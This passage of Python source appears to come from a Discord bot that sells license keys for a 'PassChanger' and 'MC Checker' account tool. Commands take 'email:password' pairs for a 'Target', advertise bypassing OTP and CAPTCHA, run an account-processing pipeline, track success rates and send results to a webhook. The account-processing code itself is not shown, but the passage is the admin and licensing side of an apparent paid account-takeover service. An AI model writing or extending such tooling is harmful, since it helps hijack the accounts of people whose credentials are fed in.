            {"name": "👑  Duration", "value": f"`{lic['duration_label']}`", "inline": True},
            {"name": f"{E_PIN()}  Expires", "value": exp_str, "inline": True},
            {"name": f"{E_UPDATES()}  Remaining", "value": left, "inline": True},
        ]
    ), ephemeral=True)


@bot.tree.command(name="genkey", description="[Owner] Generate a license key with custom duration")
@app_commands.describe(
    product="Which product this key is for",
    days="Number of days (0 for none)",
    hours="Number of hours (0 for none)",
    minutes="Number of minutes (0 for none)",
    seconds="Number of seconds (0 for none)",
    lifetime="Set to True for lifetime (ignores other fields)",
    key_valid_hours="How many hours the key stays redeemable (0 = forever)"
)
@app_commands.choices(product=[
    app_commands.Choice(name="Both (PassChanger + Checker)", value="both"),
    app_commands.Choice(name="PassChanger Only", value="passchanger"),
    app_commands.Choice(name="MC Checker Only", value="checker"),
])
async def gen_key_cmd(i: discord.Interaction,
                      product: str = "both",
                      days: int = 0,
                      hours: int = 0,
                      minutes: int = 0,
                      seconds: int = 0,
                      lifetime: bool = False,
                      key_valid_hours: int = 0):
    if i.user.id != ADMIN_ID and not data_manager.is_owner(i.user.id):
        await i.response.send_message(embed=err("Access Denied", f"{E_CROSS()}  Owner only."), ephemeral=True)
        return

    # Calculate duration
    if lifetime:
        duration_seconds = None
        duration_label = "Lifetime"
    else:
        duration_seconds = _parse_duration_to_seconds(days, hours, minutes, seconds)
        if not duration_seconds:
            await i.response.send_message(embed=err(
                "Invalid Duration",
                f"{E_CROSS()}  You must specify a duration or set `lifetime: True`.\n"
                f"Example: `/genkey product:PassChanger days:7` or `/genkey product:Checker lifetime:True`"
            ), ephemeral=True)
            return
        duration_label = _format_duration(duration_seconds)

    # Key validity
    kv = key_valid_hours if key_valid_hours > 0 else None
    key = generate_key(duration_seconds=duration_seconds, key_valid_hours=kv, product=product)

    product_label = {"both": "PassChanger + Checker", "passchanger": "PassChanger", "checker": "MC Checker"}[product]

    # Build embed
    fields = [
        {"name": "📦  Product", "value": f"`{product_label}`", "inline": True},
        {"name": "👑  License Duration", "value": f"`{duration_label}`", "inline": True},
        {"name": "🔑  Key", "value": f"```{key}```", "inline": False},
    ]
    if kv:
        fields.append({"name": "⏰  Key Valid For", "value": f"`{kv} hours` (expires if not redeemed)", "inline": True})
    else:
        fields.append({"name": "⏰  Key Valid For", "value": "`Forever` (no expiry until redeemed)", "inline": True})
    fields.append({"name": "⏳  Timer Starts", "value": "When the user redeems (`/redeem`)", "inline": True})
    fields.append({"name": f"{E_UPDATES()}  Note", "value": "One-time use. Share privately.", "inline": False})

    await i.response.send_message(embed=adm(
        "Key Generated",
        f"{E_TICK()}  New **{duration_label}** key created.",
        fields
    ), ephemeral=True)


@bot.tree.command(name="listkeys", description="[Admin] View all generated keys")
async def list_keys_cmd(i: discord.Interaction):
    if i.user.id != ADMIN_ID and not data_manager.is_owner(i.user.id):
        await i.response.send_message(embed=err("Access Denied", f"{E_CROSS()}  Admin/Owner only."), ephemeral=True)
        return
    all_keys = list_all_keys()
    if not all_keys:
        await i.response.send_message(embed=info("No Keys", "No keys generated yet."), ephemeral=True)
        return
    icons = {"unused": "⚪", "active": f"{E_TICK()}", "active_lifetime": f"{E_DIAMOND()}", "expired": f"{E_CROSS()}", "key_expired": "⏰"}
    lines = []
    for k in all_keys[-20:]:
        by = f"<@{k['redeemed_by']}>" if k["redeemed_by"] else "—"
        exp = "Never" if not k.get("license_expires_at") else datetime.fromisoformat(k["license_expires_at"]).strftime("%d/%m/%y")
        lines.append(f"{icons.get(k['status'],'•')} `{k['key']}` · **{k['duration_label']}** · {by} · {exp}")
    unused = sum(1 for k in all_keys if k["status"] == "unused")
    active = sum(1 for k in all_keys if k["status"] in ("active", "active_lifetime"))
    expired = sum(1 for k in all_keys if k["status"] in ("expired", "key_expired"))
    await i.response.send_message(embed=adm(
        "Key Registry", "\n".join(lines),
        [
            {"name": "⚪  Unused", "value": str(unused), "inline": True},
            {"name": f"{E_TICK()}  Active", "value": str(active), "inline": True},
            {"name": f"{E_CROSS()}  Expired", "value": str(expired), "inline": True},
        ]
    ), ephemeral=True)


@bot.tree.command(name="revokekey", description="[Admin] Revoke all keys for a user")
@app_commands.describe(user="User to revoke")
async def revoke_key_cmd(i: discord.Interaction, user: discord.User):
    if i.user.id != ADMIN_ID and not data_manager.is_owner(i.user.id):
        await i.response.send_message(embed=err("Access Denied", f"{E_CROSS()}  Admin/Owner only."), ephemeral=True)
        return
    revoke_user_keys(user.id)
    data_manager.revoke_user(user.id)
    await i.response.send_message(embed=ok(
        "License Revoked",
        f"{E_TICK()}  All keys for {user.mention} expired and access removed."
    ), ephemeral=True)


# ═══════════════════════════════════════════════
#  OWNER SYSTEM
# ═══════════════════════════════════════════════

def check_owner():
    """Check if user is an owner (has full access, bypasses everything)."""
    async def predicate(i: discord.Interaction) -> bool:
        if data_manager.is_owner(i.user.id) or i.user.id == ADMIN_ID:
            return True
        await i.response.send_message(
            embed=err("Access Denied", f"{E_CROSS()}  Owner-only command."), ephemeral=True
        )
        return False
    return app_commands.check(predicate)


@bot.tree.command(name="owner", description="[Owner] Owner control panel")
@check_owner()
async def owner_panel(i: discord.Interaction):
    owners = data_manager.load_owners()
    owner_list = "\n".join([f"• <@{uid}>" for uid in owners]) or "No owners configured."
    await i.response.send_message(embed=adm(
        "Owner Panel",
        f"Full access — bypass all restrictions.\n\n{SEP}",
        [
            {"name": "👑  Owners", "value": owner_list, "inline": False},
            {"name": f"{E_SETTINGS()}  Owner Commands",
             "value": (
                 "`/owner` — This panel\n"
                 "`/owner_add @user` — Add an owner\n"
                 "`/owner_remove @user` — Remove an owner\n"
                 "`/owner_process <email:pass>` — Process (skip OTP/captcha bypass)\n"
                 "`/owner_authorize @user` — Grant access\n"
                 "`/owner_revoke @user` — Remove access\n"
                 "`/owner_genkey <plan>` — Generate key\n"
                 "`/owner_webhook <url>` — Set webhook\n"
                 "`/owner_stats` — View stats"
             ), "inline": False},
            {"name": f"{E_TICK()}  Privileges",
             "value": (
                 "• Bypass OTP/login requirement\n"
                 "• Bypass license checks\n"
                 "• Bypass CAPTCHA (auto-retry)\n"
                 "• Full admin access to all commands"
             ), "inline": False},
        ]
    ), ephemeral=True)


@bot.tree.command(name="owner_add", description="[Owner] Add a new owner")
@app_commands.describe(user="User to add as owner")
@check_owner()
async def owner_add(i: discord.Interaction, user: discord.User):
    owners = data_manager.load_owners()
    if user.id in owners:
        await i.response.send_message(
            embed=info("Already Owner", f"{E_TICK()}  {user.mention} is already an owner."),
            ephemeral=True
        )
        return
    owners.append(user.id)
    data_manager.save_owners(owners)
    # Also auto-authorize them
    if not data_manager.is_authorized(user.id):
        data_manager.authorize_user(user.id, i.user.id)
    await i.response.send_message(embed=ok(
        "Owner Added",
        f"{E_TICK()}  {user.mention} is now an owner with full bot access.",
        [{"name": "User ID", "value": f"`{user.id}`", "inline": True}]
    ), ephemeral=True)
    await send_webhook_log(
        "Owner Added",
        f"{user.mention} was added as an owner by <@{i.user.id}>",
        color=C_GOLD, user_id=i.user.id
    )


@bot.tree.command(name="owner_remove", description="[Owner] Remove an owner")
@app_commands.describe(user="User to remove from owner list")
@check_owner()
async def owner_remove(i: discord.Interaction, user: discord.User):
    owners = data_manager.load_owners()
    if user.id not in owners:
        await i.response.send_message(
            embed=err("Not an Owner", f"{E_CROSS()}  {user.mention} is not in the owner list."),
            ephemeral=True
        )
        return
    owners.remove(user.id)
    data_manager.save_owners(owners)
    await i.response.send_message(embed=ok(
        "Owner Removed",
        f"{E_TICK()}  {user.mention} is no longer an owner."
    ), ephemeral=True)
    await send_webhook_log(
        "Owner Removed",
        f"{user.mention} was removed as owner by <@{i.user.id}>",
        color=C_WARN, user_id=i.user.id
    )


@bot.tree.command(name="owner_process", description="[Owner] Process account (bypasses OTP requirement)")
@app_commands.describe(account="Format: email:password")
@check_owner()
async def owner_process(i: discord.Interaction, account: str):
    uid = i.user.id

    if ":" not in account:
        await i.response.send_message(
            embed=err("Invalid Format",
                      f"{E_CROSS()}  Expected `email:password`\nExample: `user@outlook.com:Pass123`"),
            ephemeral=True
        )
        return

    if uid in data_manager.processing_sessions:
        await i.response.send_message(
            embed=warn("Already Running",
                       f"{E_ALERT()}  You have an active process.\nUse `/cancel` to abort first."),
            ephemeral=True
        )
        return

    email, password = account.split(":", 1)
    email, password = email.strip(), password.strip()

    await i.response.send_message(embed=brand(
        "Owner Pipeline Initiated",
        f"👑  Owner bypass active\n{E_RECORD()}  Target: `{email}`\n\n"
        f"{E_UPDATES()}  Live progress tracker will appear below."
    ))

    asyncio.create_task(process_account_full(email, password, uid, i.channel))


@bot.tree.command(name="owner_authorize", description="[Owner] Grant a user access")
@app_commands.describe(user="User to authorize")
@check_owner()
async def owner_authorize(i: discord.Interaction, user: discord.User):
    if data_manager.is_authorized(user.id):
        await i.response.send_message(
            embed=info("Already Authorized", f"{E_TICK()}  {user.mention} already has access."),
            ephemeral=True
        )
        return
    data_manager.authorize_user(user.id, i.user.id)
    await i.response.send_message(embed=ok(
        "Access Granted",
        f"{E_TICK()}  {user.mention} added to the access list by owner.",
        [{"name": f"{E_MAIL()}  User ID", "value": f"`{user.id}`", "inline": True}]
    ))
    await send_webhook_log(
        "User Authorized (Owner)",
        f"{user.mention} was authorized by owner <@{i.user.id}>",
        color=C_SUCCESS, user_id=i.user.id
    )


@bot.tree.command(name="owner_revoke", description="[Owner] Remove user access")
@app_commands.describe(user="User to revoke")
@check_owner()
async def owner_revoke(i: discord.Interaction, user: discord.User):
    if data_manager.is_owner(user.id):
        await i.response.send_message(
            embed=err("Blocked", f"{E_CROSS()}  Cannot revoke another owner. Remove them first with `/owner_remove`."),
            ephemeral=True
        )
        return
    data_manager.revoke_user(user.id)
    revoke_user_keys(user.id)
    await i.response.send_message(
        embed=ok("Revoked", f"{E_TICK()}  {user.mention}'s access and keys revoked by owner.")
    )
    await send_webhook_log(
        "User Revoked (Owner)",
        f"{user.mention} was revoked by owner <@{i.user.id}>",
        color=C_ERROR, user_id=i.user.id
    )


@bot.tree.command(name="owner_genkey", description="[Owner] Generate a license key with custom duration")
@app_commands.describe(
    days="Number of days (0 for none)",
    hours="Number of hours (0 for none)",
    minutes="Number of minutes (0 for none)",
    seconds="Number of seconds (0 for none)",
    lifetime="Set to True for lifetime (ignores other fields)",
    key_valid_hours="How many hours the key stays redeemable (0 = forever)"
)
@check_owner()
async def owner_gen_key(i: discord.Interaction,
                        days: int = 0,
                        hours: int = 0,
                        minutes: int = 0,
                        seconds: int = 0,
                        lifetime: bool = False,
                        key_valid_hours: int = 0):
    # Calculate duration
    if lifetime:
        duration_seconds = None
        duration_label = "Lifetime"
    else:
        duration_seconds = _parse_duration_to_seconds(days, hours, minutes, seconds)
        if not duration_seconds:
            await i.response.send_message(embed=err(
                "Invalid Duration",
                f"{E_CROSS()}  Specify a duration or set `lifetime: True`.\n"
                f"Example: `/owner_genkey days:7` or `/owner_genkey hours:12`"
            ), ephemeral=True)
            return
        duration_label = _format_duration(duration_seconds)

    kv = key_valid_hours if key_valid_hours > 0 else None
    key = generate_key(duration_seconds=duration_seconds, key_valid_hours=kv)

    fields = [
        {"name": "👑  License Duration", "value": f"`{duration_label}`", "inline": True},
        {"name": "🔑  Key", "value": f"```{key}```", "inline": False},
    ]
    if kv:
        fields.append({"name": "⏰  Key Valid For", "value": f"`{kv} hours`", "inline": True})
    else:
        fields.append({"name": "⏰  Key Valid For", "value": "`Forever`", "inline": True})
    fields.append({"name": "⏳  Timer Starts", "value": "On `/redeem`", "inline": True})
    fields.append({"name": f"{E_UPDATES()}  Note", "value": "One-time use. Share privately.", "inline": False})

    await i.response.send_message(embed=adm(
        "Key Generated (Owner)",
        f"👑  {E_TICK()}  New **{duration_label}** key created.",
        fields
    ), ephemeral=True)


@bot.tree.command(name="owner_webhook", description="[Owner] Set the results webhook URL")
@app_commands.describe(webhook_url="Discord webhook URL")
@check_owner()
async def owner_set_webhook(i: discord.Interaction, webhook_url: str):
    if not webhook_url.startswith("https://discord.com/api/webhooks/"):
        await i.response.send_message(
            embed=err("Invalid URL", f"{E_CROSS()}  Must be a valid Discord webhook URL."),
            ephemeral=True
        )
        return
    data_manager.config["webhook_url"] = webhook_url
    data_manager.save_config()
    await i.response.send_message(
        embed=ok("Webhook Set (Owner)", f"👑  {E_TICK()}  Results will now dispatch to the new webhook."),
        ephemeral=True
    )


@bot.tree.command(name="owner_stats", description="[Owner] View detailed statistics")
@check_owner()
async def owner_stats(i: discord.Interaction):
    s    = data_manager.stats
    rate = (s["total_success"] / s["total_processed"] * 100) if s["total_processed"] else 0
    top  = sorted(s["users_served"].items(), key=lambda x: x[1]["processed"], reverse=True)[:5]
    top_text = "\n".join(
        f"{E_TICK()}  <@{uid}> — {d['processed']} processed ({d['success']} success)"
        for uid, d in top
    ) or f"{E_UPDATES()}  No data yet."
    owners = data_manager.load_owners()
    await i.response.send_message(embed=adm(
        "Owner Stats Panel", f"👑  Full statistics\n{SEP}",
        [
            {"name": f"{E_UPDATES()}  Volume",
             "value": f"Total: **{s['total_processed']}**\n{E_TICK()} {s['total_success']}  {E_CROSS()} {s['total_failed']}",
             "inline": True},
            {"name": f"{E_RECORD()}  Success Rate", "value": f"**{rate:.1f}%**", "inline": True},
            {"name": f"{E_BOOK()}  Users",
             "value": f"Auth'd: **{len(data_manager.authorized_users)}**\nActive: **{len(data_manager.active_sessions)}**\nOwners: **{len(owners)}**",
             "inline": True},
            {"name": f"{E_PIN()}  Top Operators", "value": top_text, "inline": False},
            {"name": "👑  Webhook",
             "value": f"{E_TICK()} Configured" if data_manager.config.get("webhook_url") else f"{E_CROSS()} Not set",
             "inline": True},
        ]
    ), ephemeral=True)


# ═══════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════
if __name__ == "__main__":
    # Load from .env file if it exists
    if os.path.exists(".env"):
        with open(".env") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    k, v = line.split("=", 1)
                    os.environ.setdefault(k.strip(), v.strip())

    # Get token: env var first, then command line argument
    token = os.environ.get("DISCORD_TOKEN") or (sys.argv[1] if len(sys.argv) > 1 else None)

    if not token:
        print("\n  Bot token required.")
        print("  Usage: python passchanger.py <BOT_TOKEN>")
        print("  Or create a .env file with: DISCORD_TOKEN=your_token_here\n")
        sys.exit(1)

    try:
        bot.run(token)
    except discord.errors.LoginFailure:
        print("\n  Invalid token.\n")
    except KeyboardInterrupt:
        print("\n  Shutting down…\n")
    except Exception as e:
        print(f"\n  Fatal: {e}\n")
        traceback.print_exc()